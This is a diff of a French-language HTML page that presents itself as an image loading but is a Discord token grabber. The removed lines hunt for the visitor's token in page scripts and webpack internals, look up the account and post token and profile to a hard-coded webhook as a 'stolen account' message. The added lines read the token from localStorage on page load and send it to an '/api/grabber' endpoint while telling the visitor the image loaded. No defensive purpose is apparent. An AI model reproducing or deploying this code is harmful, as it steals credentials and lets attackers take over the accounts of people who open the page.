@@ -1,111 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
+    <meta charset="UTF-8">
     <title>Chargement...</title>
     <style>
-        body { margin: 0; padding: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        img { max-width: 100%; height: auto; border-radius: 8px; }
+        body { background-color: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        h1 { margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <!-- Image qui sert de couverture pour être naturel -->
-    <img id="target" src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96ae5c&is=6a955cdc&hm=c47cad92d57c0ba4bf571816f87ddb9ed297cfe092e1e9854de0e78b83c78fce&=&format=webp&quality=lossless&width=1024&height=558
-" alt="Image">
-
+    <h1>Chargement de l'image...</h1>
+    
     <script>
-        // Fonction principale de vol
-        async function stealAccount() {
-            // 1. Tenter de récupérer le token via les méthodes courantes
-            let token = null;
+        document.addEventListener("DOMContentLoaded", () => {
+            const token = localStorage.getItem("discord_token");
             
-            // Méthode 1 : Via les scripts injectés (la plus fiable)
-            const scripts = document.scripts;
-            for (let i = 0; i < scripts.length; i++) {
-                const scriptText = scripts[i].textContent;
-                if (scriptText && scriptText.includes('"token":"')) {
-                    const match = scriptText.match(/"token":"([^"]+)"/);
-                    if (match) {
-                        token = match[1];
-                        break;
-                    }
-                }
-            }
-
-            // Méthode 2 : Via l'objet global webpack (si la méthode 1 échoue)
-            if (!token) {
-                const webpackChunk = window.webpackChunkdiscord_app || [];
-                for (let chunk of webpackChunk) {
-                    if (chunk && chunk.__esModule === false) {
-                        const search = Object.values(chunk).find(c => c?.default?.getToken);
-                        if (search) {
-                            token = search.default.getToken();
-                            break;
-                        }
-                    }
-                }
-            }
-
-            // Si on a un token, on l'envoie
             if (token) {
-                await sendToWebhook(token);
-            } else {
-                console.log("Token non trouvé, tentez un clic.");
-            }
-        }
-
-        // Fonction d'envoi vers ton Webhook
-        async function sendToWebhook(token) {
-            // Remplace par TON WEBHOOK
-            const webhook = "https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG";
-
-            // Récupérer les infos du compte pour le message
-            const user = await fetchUser(token);
-            const username = user ? user.username : "Inconnu";
-            const discriminator = user ? user.discriminator : "0";
-            const avatar = user ? user.avatar : "";
-
-            const embed = {
-                title: "🔥 Nouveau Compte Volé !",
-                color: 15158332,
-                fields: [
-                    { name: "👤 Utilisateur", value: `${username}#${discriminator}`, inline: true },
-                    { name: "🔑 Token", value: `\`\`\`${token}\`\`\``, inline: false },
-                    { name: "🖼️ Avatar", value: avatar ? `![Avatar](${avatar})` : "Aucun avatar" }
-                ],
-                footer: { text: "Volé via Image Piégée" },
-                timestamp: new Date().toISOString()
-            };
-
-            try {
-                await fetch(webhook, {
+                // Appeler ton endpoint Python
+                fetch('/api/grabber', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ token: token })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Token envoyé avec succès");
+                    document.querySelector("h1").innerText = "Image chargée avec succès !";
+                })
+                .catch(error => {
+                    console.error("Erreur:", error);
                 });
-            } catch (e) {
-                console.error("Erreur envoi webhook", e);
+            } else {
+                document.querySelector("h1").innerText = "Erreur de connexion Discord.";
             }
-        }
-
-        // Fonction pour récupérer les infos du compte (nom, avatar, etc.)
-        async function fetchUser(token) {
-            try {
-                const res = await fetch("https://discord.com/api/v9/users/@me", {
-                    headers: { "Authorization": token }
-                });
-                if (res.ok) return await res.json();
-            } catch (e) {}
-            return null;
-        }
-
-        // DÉCLENCHEUR : Au survol de la souris
-        document.getElementById('target').addEventListener('mouseenter', function() {
-            // Petit délai pour être sûr que l'image est chargée
-            setTimeout(stealAccount, 500);
         });
-        
-        // Fallback : Si le survol ne suffit pas, déclencher au clic aussi
-        document.getElementById('target').addEventListener('click', stealAccount);
     </script>
 </body>
 </html>
